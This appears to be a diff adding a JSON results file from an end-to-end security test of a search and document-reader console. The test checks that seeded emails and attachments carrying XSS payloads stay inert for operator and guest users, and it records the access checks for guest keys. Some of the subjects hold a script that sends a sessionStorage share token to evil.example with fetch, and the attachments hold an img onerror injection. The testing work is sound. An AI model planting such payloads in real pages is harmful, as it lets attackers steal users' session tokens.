@@ -1,0 +1,181 @@
+{
+  "indices": [
+    ".xerj-memory-casefile-edges:34",
+    ".xerj_alert_fires:0",
+    ".xerj_alert_rules:0",
+    ".xerj_api_tokens:0",
+    ".xerj_audit:0",
+    ".xerj_cluster_state:0",
+    ".xerj_connections:0",
+    ".xerj_dashboards:17",
+    ".xerj_idp_config:0",
+    ".xerj_magic_links:1",
+    ".xerj_passkeys:0",
+    ".xerj_prefs:0",
+    ".xerj_sessions:0",
+    ".xerj_users:0",
+    ".xerj_views:0",
+    "autoindex-catalog:12",
+    "ax-docs:81"
+  ],
+  "datasets": [
+    {
+      "index": "ax-docs",
+      "records": 81,
+      "formats": [
+        "eml",
+        "pdf",
+        "txt-prose"
+      ],
+      "semantic_field": "body"
+    }
+  ],
+  "hostileRecords": [
+    {
+      "id": "fb81902053ee81ad7a7641a706968407",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…"
+    },
+    {
+      "id": "881498573b3ff47d8dc1098b870f0adb",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 1
+    },
+    {
+      "id": "f8ad704a27be53c4795ab2e75aefb5f4",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 2
+    },
+    {
+      "id": "6a591e7deb3e46c37ab589901f82bfd5",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 3
+    },
+    {
+      "id": "45994aa9740e02eada10c8c3d46f2ce7",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 3
+    },
+    {
+      "id": "690ba24c2cdf4d53dc298f1058d1e8d3",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 3
+    },
+    {
+      "id": "f5beeb39db7c6b1e6d0aa2446d8e0fa6",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 4
+    },
+    {
+      "id": "bae349fdcfc9fa6d6527c40b39a19282",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 5
+    },
+    {
+      "id": "0c978ca8c573e040934d319cca28ebbb",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 6
+    },
+    {
+      "id": "d10137ce7317204abb3d5f3bd0229f53",
+      "subject": "Overdue invoice <script>window.__xerjPwned=(wind…",
+      "attachment": "\"><img src=x onerror=window.__xe…",
+      "page": 7
+    }
+  ],
+  "engineHighlight": [
+    "Quarterly invoice reminder",
+    "Overdue invoice <script>window.__xerjPwned=(window.__xerjPwned||0)+1;fetch('https://evil.example/k?'+sessionStorage.getItem('xerj.share'))</script><im..."
+  ],
+  "operatorNodeIsOurs": true,
+  "operator": {
+    "landedOn": "#/second-brain?brain=casefile",
+    "corpusCards": [
+      "ax-docs | 81 records10 files2.8 MB· last run"
+    ],
+    "corpusPill": "LIVE · Xerj · UPDATED JUST NOW · 5.6MS",
+    "reader": {
+      "title": "Overdue invoice <script>window.__xerjPwned=(window.__xerjPwned||0)+1;fetch('http",
+      "attachments": [
+        "\"><img src=x onerror=window.__xerjPwned=(window.__xerjPwned|"
+      ],
+      "marks": 5,
+      "listHead": "3 RESULTS · CLICK TO OPEN",
+      "graph": "LINKED RECORDS · FROM THE BRAINThe graph API refused this console session (HTTP 401). On an auth-enabled engine the graph needs an engine API key; records and search still work.",
+      "pill": "LIVE · ax-docs · UPDATED JUST NOW · 0MS"
+    },
+    "discover": {
+      "eyebrow": [
+        "RESULTS · ax-docs",
+        "DATE_HISTOGRAM · EMAIL_DATE · 1D",
+        "REQUEST · POST /ax-docs/_search · AS SENT"
+      ],
+      "rows": 25,
+      "error": null,
+      "facets": [
+        "_INDEX",
+        "ATTACHMENT_CONTENT_TYPE",
+        "EMAIL_FROM",
+        "EMAIL_TO"
+      ],
+      "indexButtons": [
+        "*",
+        "ax-docs"
+      ]
+    }
+  },
+  "operatorInert": {
+    "pwned": 0,
+    "cspViolations": [],
+    "dialogs": 0,
+    "foreignRequests": []
+  },
+  "guestKey": {
+    "ownSearch": 200,
+    "ownMapping": 200,
+    "ego": 200,
+    "otherIndexSearch": 403,
+    "catalogSearch": 403,
+    "write": 403,
+    "consoleMe": 401
+  },
+  "guest": {
+    "banner": "Guest · read-only · Casefile (live e2e) · expires 2026-09-19 22:23 UTC (in 59m)",
+    "nav": [
+      "CORPUS",
+      "READER"
+    ],
+    "title": "Overdue invoice <script>window.__xerjPwned=(window.__xerjPwned||0)+1;fetch('http",
+    "attachments": [
+      "\"><img src=x onerror=window.__xerjPwned=(window.__xerjPwned|"
+    ],
+    "marks": 5,
+    "graph": "LINKED RECORDS · FROM THE BRAINSAME FOLDER · 2←FILE04.eml→FILE06.eml2 linked records · brain casefile · 1 hop · 2 of them are links of the file this record came from (inbox/05.eml) — file-level detectors link files, not the records inside them",
+    "attachmentPage": {
+      "eyebrow": "PDF ATTACHMENT · PAGE 1",
+      "title": "\"><img src=x onerror=window.__xerjPwned=(window.__xerjPwned||0)+1;fetc",
+      "bodyChars": 553
+    },
+    "corpus": "DATASETax-docs81 recordsemails 6attachment records 43formats eml 55, pdf 22, txt-prose 4OPEN IN READER",
+    "dataRequests": [
+      "GET /favicon.ico",
+      "GET /ax-docs/_mapping",
+      "POST /ax-docs/_search",
+      "GET /_graph/casefile/ego"
+    ],
+    "consoleApiRequests": 0
+  },
+  "guestInert": {
+    "pwned": 0,
+    "cspViolations": [],
+    "dialogs": 0,
+    "foreignRequests": []
+  }
+}
